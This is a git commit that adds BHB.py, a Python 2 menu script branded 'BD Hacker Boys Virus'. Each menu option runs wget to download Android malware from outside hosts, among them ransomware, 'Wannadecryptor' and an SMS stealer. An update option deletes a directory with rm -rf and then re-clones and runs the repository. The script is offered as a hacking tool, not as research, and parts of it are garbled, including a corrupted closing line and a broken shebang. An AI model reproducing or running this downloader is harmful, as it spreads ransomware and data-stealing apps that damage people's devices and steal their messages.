563a15f7f643f7c84a78e5ad6e2c527dd6950aad
BD Hacker Boys <71561580+KingNasirul@users.noreply.github.com>
2020-09-26 09:32:17 +0600

    Add files via upload

---
+++ BHB.py
@@ -0,0 +1,191 @@
+#!/usr/bin/evn python
+
+import sys
+import os
+import time
+import os as sistema
+
+# Set color
+R = '\033[31m' # Red
+N = '\033[1;37m' # White
+G = '\033[32m' # Green
+O = '\033[0;33m' # Orange
+B = '\033[1;34m' #Blue
+os.system("cd banner;python2 banner4.py")
+print
+print ("\033[49m                   Welcome To BD Hacker Boys Virus                    \033[0m")
+print ("\033[48m                   Author: KingNasirul                   \033[0m")
+print
+
+os.system("cd banner;python2 table.py")
+
+def help():
+  print
+  print ("\033[44m Developer : KingNasirul\033[0m")
+  print ("\033[44m Program : BHBVirus\033[0m")
+  print ("\033[44m Based On Python\033[0m")
+  print
+  main()
+
+def main():
+  dr = raw_input(">>> ")
+  if dr == "show options":
+    time.sleep(1)
+    help()
+    main()
+    
+    ############
+    ###BHBV1###
+    ###########
+  elif dr == "00":
+		android = raw_input(""+R+"BHB"+B+"Virus > ")
+		if android == "run":
+			time.sleep(1)
+			print (""+G+"DroidXAntivirus")
+			time.sleep(2)
+			print
+			print ""+B+"[*] "+N+"Downloading..."
+			time.sleep(1)
+			os.system("cd virus;mkdir Antivirus;cd Antivirus;wget https://github.com/ashishb/android-malware/raw/master/unclassified_apks/DroidXAntivirus.apk")
+			print
+			print "Now check folder Virus on "+R+"/BHBVirus/virus/Antivirus/"+N+""
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
+  elif dr == "01":
+		rez = raw_input(""+R+"BHB"+B+"Virus > ")
+		if rez == "run":
+			time.sleep(1)
+			print (""+G+"Freeze")
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir freeze;cd freeze;wget http://zumizec-com.waper.co/files/freeze.apk")
+			print
+			print "Now check folder virus on"+R+" /BHBVirus/virus/freeze/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
+  elif dr == "02":
+		dea = raw_input(""+R+"BHB"+B+"Virus > ")
+		if dea == "run":
+			time.sleep(1)
+			print (""+G+"Ransomware")
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir androidran;cd androidran;wget http://loolzec.blogwaper.com/files/androidransomware.zip")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/BHBVirus/virus/androidran/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
+  elif dr == "03":
+		dea = raw_input(""+N+"BHBVirus > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir malware;cd malware;wget http://loolzec.blogwaper.com/files/b.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/BHBVirus/virus/malware/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
+  elif dr == "04":
+		dea = raw_input(""+N+"BHB"+B+"Virus > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir Wannadecryptor;cd Wannadecryptor;wget http://loolzec.blogwaper.com/files/wannadecryptor.apk")
+			time.sleep(1)
+			print
+			print "Now check foVIRvirus on "+R+"/BHBVirus/virus/Wannadecryptor/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
+  elif dr == "05":
+		dea = raw_input(""+N+"BHB"+B+"Virus > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir Wannadecryptor2;cd Wannadecryptor2;wget http://loolzec.blogwaper.com/files/wannadecryptor.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/BHBVirus/virus/Wannadecryptor2/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Job finished"
+			print
+			main()
+  elif dr == "06":
+		dea = raw_input(""+N+"BHB"+B+"Virus > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir sms_tief;cd sms_tief;wget http://loolzec.blogwaper.com/files/smsthief.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/BHBVirus/virus/sms_tief/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			main()
+  elif dr == "07":
+		dea = raw_input(""+N+"BHB"+B+"virus > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir dangerous-malware;cd dangerous-malware;wget http://loolzec.blogwaper.com/files/y.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/BHBVirus/virus/dangerous-malware/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
+  elif dr == "08":
+		dea = raw_input(""+N+"BHB"+B+"Virus > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir malware_enc;cd malware_enc;wget http://loolzec.blogwaper.com/files/30208552a677cce35d4863d3d85b85.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/BHBVirus/virus/malware_enc/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
+  elif dr == "09":
+		dea = raw_input(""+N+"BHB"+B+"Virus > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir malware_bnews;cd malware_bnews;wget http://loolzec.blogwaper.com/files/benews.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/BHBVirus/virus/malware_bnews/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
+  elif dr == "BHBvirus update":
+    print ""+G+"~ "+B+"UPDATING..."
+    time.sleep(2)
+    print ""+G+"Cloning repo..."
+    time.sleep(6)
+    os.system("cd ..;rm -rf VirusX;git clone https://github.com/KingNasirul/BHBVirus;cd BHBVirus;python2 BHB.py")
+    main()
+  elif dr == "10":
+    time.sleep(1)
+    print ""+R+"exiting..."
+    time.sleep(1)
+    print "bye_bye"
+    sys.exit()
+  else:
+    print ("Invalid Input : "),dr
+    os.system("cd script;python2 esprint.py")
+    print
+    main()DarkXpl__ == "__main__":
+	main()
+  
